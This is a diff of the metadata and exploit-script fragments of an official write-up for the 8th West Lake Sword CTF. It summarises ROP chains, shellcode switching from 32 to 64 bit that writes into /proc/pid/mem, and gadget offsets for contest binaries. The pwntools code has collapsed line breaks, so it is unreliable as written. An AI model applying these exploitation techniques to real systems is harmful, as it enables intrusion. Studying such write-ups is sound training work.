@@ -11,7 +11,9 @@ tags:
 - AES-CBC+HMAC
 - PWN-babytrace
 - Heaven's door-32/64切换+proc-mem,Vpwn-栈溢出-edit高地址,RE-BitDance位重排
-attack_chain: 'MISC-糟糕的磁盘: img1-5 gSoNiXLC/uGZ85OzT/m8X4exzG/Fsiq6lKn/suPVGqm6顺序合并|CSCS: 5张img合并+RSA+已知p/q(差6)+AES-CBC+HMAC-SHA256+COM_UnMunge2(XOR+LongSwap+表)→secret.pcapng|Heaven''s door: i386 32位shellcode + retfq切64位 + open /proc/{pid}/mem + lseek + write madain_heaven|BitDance: 767位BitDanceDecode box[223,64,650,...]位重排|新CSCS: AES-128-CBC(b''abcdefghijklmnop'') + HMAC验证|PWN-babytrace: int3(0x1723F8)+pop rax链+add rsp,0x78 ret + read /flag|Vpwn: StackVector.show+edit索引18-25写32位+32位高地址拼64位ROP'
+attack_chain:
+- 'MISC-糟糕的磁盘: img1-5 gSoNiXLC/uGZ85OzT/m8X4exzG/Fsiq6lKn/suPVGqm6顺序合并|CSCS: 5张img合并+RSA+已知p/q(差6)+AES-CBC+HMAC-SHA256+COM_UnMunge2(XOR+LongSwap+表)'
+- 'secret.pcapng|Heaven''s door: i386 32位shellcode + retfq切64位 + open /proc/{pid}/mem + lseek + write madain_heaven|BitDance: 767位BitDanceDecode box[223,64,650,...]位重排|新CSCS: AES-128-CBC(b''abcdefghijklmnop'') + HMAC验证|PWN-babytrace: int3(0x1723F8)+pop rax链+add rsp,0x78 ret + read /flag|Vpwn: StackVector.show+edit索引18-25写32位+32位高地址拼64位ROP'
 key_payload: img1..5 合并|sha256(AES_key + HMAC_key) = hashlib.sha256(raw_aes_keys).digest()|int3+pop rax(0x1723F8)+call j_strncmp+setz al+jmp add rsp,8 ret|rop_chain=p64(rdi)+p64(0)+p64(rsi)+p64(write_able)+p64(rdx)+p64(8)+p64(read)+...+p64(int3)+p64(stack+0x200)|bit_box[223,64,650,471,493,580,763,459,754,349,...] 767位|edit(18, pop_rdi&0xffffffff) edit(19, (pop_rdi>>32)&0xffff)
 one_liner: 第八届西湖论剑下半:MISC糟糕的磁盘(5张img合并)→RSA+AES-CBC+HMAC+COM_UnMunge2解码UDP stream→secret.pcapng|PWN-babytrace(int3+pop rax+add rsp,0x78 ret读/flag)+Heaven's door(32/64切换+open /proc/pid/mem+lseek+write)+Vpwn(StackVector.edit高32/低32写64位ROP)|RE-BitDance(767位BitDanceDecode box位重排)
 lesson: 1) 磁盘取证合并:多img按特定顺序(gSoNiXLC等)合并为完整磁盘; 2) COM_UnMunge2算法:=XOR seq→_LongSwap(c)→XOR ~seq→4字节内j循环表mungify_table2; 3) Heaven's door:32位shellcode入口+retfq+CS 0x33切换64位+open /proc/{pid}/mem+lseek(SEEK_SET,made_in_heaven)+write shellcode; 4) babytrace:libc-2.35 int3+pop rax+add rsp,0x78 ret; 5) Vpwn:StackVector 64位地址分两次写(低32+高32)+edit(18..25)对应位置; 6) BitDance:BitDanceDecode用box[223,64,650,...]做位重排,cipher[0]>>7取srcBit,循环count=len*8次
@@ -54,6 +56,9 @@ prerequisites:
 - RSA 公钥 ASN.1 解码
 - AES-CBC + HMAC-SHA256 协议
 - strace ptrace 调试基础
+contest_normalized: "西湖论剑"
+contest_year: 2025
+subcategory_guess: "traffic_analysis"
 ---
 # 第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write Up（下）
 
@@ -255,8 +260,8 @@ BitDance
 
 ```python#-*- coding=utf-8 -*-from pwn import *from sys import argv
 s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
-u32(data.ljust(4,' '))uu64 = lambda data :
-u64(data.ljust(8,' '))leak = lambda name,addr :
+u32(data.ljust(4,'\\x00'))uu64 = lambda data :
+u64(data.ljust(8,'\\x00'))leak = lambda name,addr :
 log.success('{} = {:#x}'.format(name, addr))
 def dbg(a=''): gdb.attach(sh, a) pause()
 binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
@@ -270,8 +275,8 @@ global shglobal libc
 if __name__ == "__main__": pwn('localhost:
 9999', 0)python#-*- coding=utf-8 -*-from pwn import *from sys import argvimport re
 s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
-u32(data.ljust(4,' '))uu64 = lambda data :
-u64(data.ljust(8,' '))leak = lambda name,addr :
+u32(data.ljust(4,'\\x00'))uu64 = lambda data :
+u64(data.ljust(8,'\\x00'))leak = lambda name,addr :
 log.success('{} = {:#x}'.format(name, addr))
 def dbg(a=''): gdb.attach(sh, a) pause()
 binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
@@ -555,8 +560,8 @@ show()pause()p.recvuntil("StackVector contents: ")data_list = p.recvuntil("n")da
 # show()p.interactive()```
 ```python#-*- coding=utf-8 -*-from pwn import *from sys import argv
 s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
-u32(data.ljust(4,' '))uu64 = lambda data :
-u64(data.ljust(8,' '))leak = lambda name,addr :
+u32(data.ljust(4,'\\x00'))uu64 = lambda data :
+u64(data.ljust(8,'\\x00'))leak = lambda name,addr :
 log.success('{} = {:#x}'.format(name, addr))
 def dbg(a=''): gdb.attach(sh, a) pause()
 binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
@@ -571,8 +576,8 @@ if __name__ == "__main__": pwn('localhost:
 9999', 0)```
 ```python#-*- coding=utf-8 -*-from pwn import *from sys import argvimport re
 s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
-u32(data.ljust(4,' '))uu64 = lambda data :
-u64(data.ljust(8,' '))leak = lambda name,addr :
+u32(data.ljust(4,'\\x00'))uu64 = lambda data :
+u64(data.ljust(8,'\\x00'))leak = lambda name,addr :
 log.success('{} = {:#x}'.format(name, addr))
 def dbg(a=''): gdb.attach(sh, a) pause()
 binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
